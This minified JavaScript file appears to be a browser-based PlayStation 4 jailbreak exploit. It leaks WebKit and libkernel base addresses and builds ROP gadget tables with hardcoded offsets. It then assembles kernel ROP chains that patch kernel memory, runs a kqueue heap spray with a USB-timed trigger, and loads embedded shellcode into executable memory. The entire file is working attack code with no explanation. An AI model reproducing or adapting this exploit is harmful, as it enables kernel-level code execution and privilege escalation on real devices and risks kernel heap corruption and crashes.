var chain,kchain,kchain2,SAVED_KERNEL_STACK_PTR,KERNEL_BASE_PTR,webKitBase,webKitRequirementBase,libSceLibcInternalBase,libKernelBase,textArea=document.createElement("textarea");const OFFSET_wk_vtable_first_element=17101072,OFFSET_WK_memset_import=680,OFFSET_WK___stack_chk_fail_import=376,OFFSET_WK_psl_builtin_import=3432,OFFSET_WKR_psl_builtin=211872,OFFSET_WK_setjmp_gadget_one=17214711,OFFSET_WK_setjmp_gadget_two=32301523,OFFSET_WK_longjmp_gadget_one=17214711,OFFSET_WK_longjmp_gadget_two=32301523,OFFSET_libcint_memset=325648,OFFSET_libcint_setjmp=767420,OFFSET_libcint_longjmp=767510,OFFSET_WK2_TLS_IMAGE=59670560,OFFSET_lk___stack_chk_fail=130912,OFFSET_lk_pthread_create=152848,OFFSET_lk_pthread_join=44960;var handle,random_path,ex_info,nogc=[],syscalls={},gadgets={},wk_gadgetmap={ret:50,"pop rdi":3249808,"pop rsi":128214,"pop rdx":39020,"pop rcx":415671,"pop r8":11512433,"pop r9":4334961,"pop rax":334354,"pop rsp":320147,"mov [rdi], rsi":27883808,"mov [rdi], rax":17271031,"mov [rdi], eax":10052796,"cli ; pop rax":354040,sti:2079692,"mov rax, [rax]":147916,"mov rax, [rsi]":5310112,"mov [rax], rsi":32495760,"mov [rax], rdx":21129858,"mov [rax], edx":3899364,"add rax, rsi":24131966,"mov rdx, rax":5502209,"add rax, rcx":195533,"mov rsp, rdi":33849442,"mov rdi, [rax + 8] ; call [rax]":7675623,infloop:32255},wkr_gadgetmap={"xchg rdi, rsp ; call [rsi - 0x79]":1930480},wk2_gadgetmap={"mov [rax], rdi":1048023,"mov [rax], rcx":2924234},hmd_gadgetmap={"add [r8], r12":179425},ipmi_gadgetmap={"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]":13387};function userland(){p.launch_chain=function(a){a.push(window.gadgets["pop rdi"]),a.push(s),a.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(i,n),textArea.scrollLeft=0,p.write8(c.add32(0),window.gadgets.ret),p.write8(c.add32(16),a.stack),p.write8(c.add32(64),p.read8(s.add32(64))),p.write8(i,d),textArea.scrollLeft=0,p.write8(i,e)},p.malloc=function(a){var i=new Uint8Array(65536+a);window.nogc.push(i);var e=p.read8(p.leakval(i).add32(16));return e.backing=i,e},p.malloc32=function(a){var i=new Uint8Array(65536+4*a);window.nogc.push(i);var e=p.read8(p.leakval(i).add32(16));return e.backing=new Uint32Array(i.buffer),e},p.stringify=function(a){for(var i=new Uint8Array(a.length+1),e=0;e<a.length;e++)i[e]=255&a.charCodeAt(e);return window.nogc.push(i),p.read8(p.leakval(i).add32(16))},p.array_from_address=function(a,i){var e=new Uint32Array(4096),r=p.leakval(e).add32(16);return p.write8(r,a),p.write4(r.add32(8),i),nogc.push(e),e},p.readstr=function(a){for(var i="",e=0;;e++){var r=p.read1(a.add32(e));if(0==r)break;i+=String.fromCharCode(r)}return i};var a=p.leakval(textArea).add32(24),i=p.read8(a),e=(i=p.read8(p.leakval(textArea).add32(24)),p.read8(i));for(var r in webKitBase=p.read8(e).sub32(OFFSET_wk_vtable_first_element),(libSceLibcInternalBase=p.read8(t(webKitBase.add32(OFFSET_WK_memset_import)))).sub32inplace(OFFSET_libcint_memset),(libKernelBase=p.read8(t(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)))).sub32inplace(OFFSET_lk___stack_chk_fail),(webKitRequirementBase=p.read8(t(webKitBase.add32(OFFSET_WK_psl_builtin_import)))).sub32inplace(OFFSET_WKR_psl_builtin),wk_gadgetmap)window.gadgets[r]=webKitBase.add32(wk_gadgetmap[r]);for(var r in wkr_gadgetmap)window.gadgets[r]=webKitRequirementBase.add32(wkr_gadgetmap[r]);function t(a){var i=65535&p.read4(a),e=p.read4(a.add32(2));return 9727!=i?0:a.add32(6+e)}var n=p.malloc32(512),d=p.malloc32(512),s=p.malloc32(64),c=p.malloc32(64);p.write8(n.add32(0),n),p.write8(n.add32(168),webKitBase.add32(OFFSET_WK_setjmp_gadget_two)),p.write8(n.add32(16),s),p.write8(n.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_setjmp)),p.write8(n.add32(456),webKitBase.add32(OFFSET_WK_setjmp_gadget_one)),p.write8(d.add32(0),d),p.write8(d.add32(168),webKitBase.add32(OFFSET_WK_longjmp_gadget_two)),p.write8(d.add32(16),c),p.write8(d.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(d.add32(456),webKitBase.add32(OFFSET_WK_longjmp_gadget_one));var l,o=new Uint8Array(4096),h=p.leakval(o).add32(16),_=p.read8(h);p.write8(h,window.libKernelBase),p.write4(h.add32(8),262144);for(var g=0;g<262144;g++)if(114==o[g]&&100==o[g+1]&&108==o[g+2]&&111==o[g+3]&&99==o[g+4]){l=g;break}p.write4(h.add32(8),l+32);var k=new Uint32Array(1),w=new Uint8Array(k.buffer);for(g=0;g<l;g++)if(72==o[g]&&199==o[g+1]&&192==o[g+2]&&73==o[g+7]&&137==o[g+8]&&202==o[g+9]&&15==o[g+10]&&5==o[g+11]){w[0]=o[g+3],w[1]=o[g+4],w[2]=o[g+5],w[3]=o[g+6];var u=k[0];window.syscalls[u]=window.libKernelBase.add32(g)}p.write8(h,_),chain=new rop}function run_hax(){userland(),0!=chain.syscall(23,0).low&&kernel();var a=chain.syscall(477,new int64(639631360,9),3145728,7,266240,-1,0),i=p.malloc32(4096),e=i.backing;e[0]=1447122753,e[1]=2202555713,e[2]=2303203564,e[3]=3343393852,e[4]=268969028,e[5]=1211900674,e[6]=270812359,e[7]=0,e[8]=703,e[9]=114176,e[10]=3526426624,e[11]=40168,e[12]=3347661056,e[13]=2370357129,e[14]=3121095796,e[15]=16,e[16]=38376,e[17]=4287185920,e[18]=446,e[19]=9824256,e[20]=2302935040,e[21]=838218239,e[22]=6482130,e[23]=2302738432,e[24]=747326662,e[25]=1170620708,e[26]=99336960,e[27]=21600328,e[28]=4152968389,e[29]=3136194892,e[30]=4096,e[31]=9704,e[32]=2143323392,e[33]=4287186151,e[34]=9960,e[35]=4152968192,e[36]=7912,e[37]=605355776,e[38]=415531848,e[39]=1581342017,e[40]=826826561,e[41]=3343434688,e[42]=960,e[43]=3397994752,e[44]=1220740367,e[45]=442567,e[46]=2303262720,e[47]=3271888842,e[48]=515950408,e[49]=1224736768,e[50]=84920969,e[51]=3234285763,e[52]=97,e[53]=264931657,e[54]=3343434501,e[55]=26816,e[56]=3397994752,e[57]=1220740367,e[58]=6996167,e[59]=2303262720,e[60]=3271888842,chain.syscall(74,i,16384,7);var r=p.malloc(16);chain.call(libKernelBase.add32(152848),r,0,i,a),awaitpl()}function kernel(){extra_gadgets(),kchain_setup(),object_setup(),trigger_spray()}function load_prx(a){var i=chain.syscall(594,p.stringify(`/${random_path}/common/lib/${a}`),0,handle,0);0!=i.low&&alert("failed to load prx/get handle "+a),p.write8(ex_info,424),0!=(i=chain.syscall(608,p.read4(handle),0,ex_info)).low&&alert("failed to get module info from handle");var e=p.read8(ex_info.add32(272));return 0!=p.read4(ex_info.add32(284))&&("libSceWebKit2.sprx"==a?e.sub32inplace(OFFSET_WK2_TLS_IMAGE):alert(`${a}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`)),e}function extra_gadgets(){var a=(handle=p.malloc(336)).add32(4);ex_info=a.add32(48),chain.syscall(602,0,a),random_path=p.readstr(a);var i=load_prx("libSceIpmi.sprx"),e=load_prx("libSceHmd.sprx"),r=load_prx("libSceWebKit2.sprx");for(var t in hmd_gadgetmap)window.gadgets[t]=e.add32(hmd_gadgetmap[t]);for(var t in wk2_gadgetmap)window.gadgets[t]=r.add32(wk2_gadgetmap[t]);for(var t in ipmi_gadgetmap)window.gadgets[t]=i.add32(ipmi_gadgetmap[t]);for(var t in window.gadgets)p.read8(window.gadgets[t])}function kchain_setup(){const a=3222592,i=3857979;SAVED_KERNEL_STACK_PTR=p.malloc(512),KERNEL_BASE_PTR=SAVED_KERNEL_STACK_PTR.add32(8),p.write8(KERNEL_BASE_PTR,new int64(4286636900,4294967295)),kchain=new rop,kchain2=new rop,kchain.count=0,kchain2.count=0,kchain.set_kernel_var(KERNEL_BASE_PTR),kchain2.set_kernel_var(KERNEL_BASE_PTR),kchain.push(gadgets["pop rax"]),kchain.push(SAVED_KERNEL_STACK_PTR),kchain.push(gadgets["mov [rax], rdi"]),kchain.push(gadgets["pop r8"]),kchain.push(KERNEL_BASE_PTR),kchain.push(gadgets["add [r8], r12"]);var e=kchain.write_kernel_addr_to_chain_later(a),r=kchain.write_kernel_addr_to_chain_later(2079049);kchain.push(gadgets["pop rdi"]),kchain.push(6),kchain.push(gadgets["pop rsi"]),kchain.push(gadgets["mov rsp, rdi"]),kchain.push(gadgets["pop rdx"]),kchain.push(14),kchain.push(gadgets["pop rcx"]),kchain.push(0),kchain.push(gadgets["pop r8"]),kchain.push(0);var t=kchain.get_rsp();kchain.pushSymbolic(),kchain.push(gadgets["pop rsi"]),kchain.push(2147745843),kchain.push(gadgets["pop rdi"]),kchain.push(kchain2.stack);var n=kchain.get_rsp();kchain.pushSymbolic(),kchain.finalizeSymbolic(e,t),kchain.finalizeSymbolic(r,n);var d=kchain2.write_kernel_addr_to_chain_later(1561856),s=kchain2.write_kernel_addr_to_chain_later(a);kchain2.push(gadgets["pop rdi"]),kchain2.push(6),kchain2.push(gadgets["pop rsi"]);var c=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.push(gadgets["pop rdx"]),kchain2.push(14),kchain2.push(gadgets["pop rcx"]),kchain2.push(0),kchain2.push(gadgets["pop r8"]),kchain2.push(0);var l=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(d,c),kchain2.finalizeSymbolic(s,l),kchain2.kwrite4(6449268,2202570896),kchain2.kwrite4(1168,0),kchain2.kwrite4(1218,82536939),kchain2.kwrite4(1209,994611344),kchain2.kwrite4(1205,3380973712),kchain2.kwrite4(6662,2336762603),kchain2.kwrite4(527245,0),kchain2.kwrite4(2338500,12642704),kchain2.kwrite4(2340479,2336771307),kchain2.kwrite4(2235200,3284152648),kchain2.kwrite4(1467178,934428983),kchain2.kwrite4(17827104,2),kchain2.kwrite8_kaddr(17827112,313261),kchain2.kwrite4(17827148,1),kchain2.kwrite4(i,3284607503);var o=kchain2.write_kernel_addr_to_chain_later(i);kchain2.push(gadgets["pop rdi"]),kchain2.push(2147811379);var h=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(o,h),kchain2.rax_kernel(3770769),kchain2.push(gadgets["mov rdx, rax"]),kchain2.push(gadgets["pop rsi"]),kchain2.push(SAVED_KERNEL_STACK_PTR),kchain2.push(gadgets["mov rax, [rsi]"]),kchain2.push(gadgets["pop rcx"]),kchain2.push(16),kchain2.push(gadgets["add rax, rcx"]),kchain2.push(gadgets["mov [rax], rdx"]),kchain2.push(gadgets["pop rdi"]);var _=kchain2.pushSymbolic();kchain2.push(gadgets["mov [rdi], rax"]),kchain2.push(gadgets.sti),kchain2.push(gadgets["pop rsp"]);var g=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(_,g)}function object_setup(){var a=chain.syscall(477,16384,49152,3,4114,4294967295,0),i=a.add32(16384),e=a.add32(32768);if(16384!=a.low)for(alert("enomem: "+a);;);p.write8(a,e),p.write8(a.add32(104),i),p.write8(i.sub32(121),gadgets["cli ; pop rax"]),p.write8(i.add32(0),gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]),p.write8(i.add32(8),kchain.stack),p.write8(i.add32(16),gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]),p.write8(e.add32(48),gadgets["mov rdi, [rax + 8] ; call [rax]"])}var trigger_spray=function(){for(var a=432,i=p.malloc(1728),e=0;e<a;e++)chain.fcall(window.syscalls[362]),chain.write_result4(i.add32(4*e));chain.run();var r=p.array_from_address(i,a),t=chain.syscall(97,2,1,0);if(t.low<256||t.low>=512)for(alert("invalid socket");;);var n=p.malloc(32);for(p.write8(n.add32(0),t),p.write4(n.add32(8),131071),p.write4(n.add32(12),0),p.write8(n.add32(16),0),p.write8(n.add32(24),0),e=0;e<a;e++)chain.fcall(window.syscalls[363],r[e],n,1,0,0,0);for(chain.run(),e=20;e<a;e+=2)chain.fcall(window.syscalls[6],r[e]);for(chain.run(),alert("Insert USB now. do not close the dialog until notification pops, remove usb after closing it."),e=1;e<a;e+=2)chain.fcall(window.syscalls[6],r[e]);chain.run(),0!=chain.syscall(23,0).low&&(alert("Failed to trigger the exploit,  This happened because you plugged it in too late/early or not at all.\n    if you did plug it in then the kernel heap is slightly corrupted, this might cause panics later on.\n    closing this alert will crash the browser for you."),p.write8(0,0))};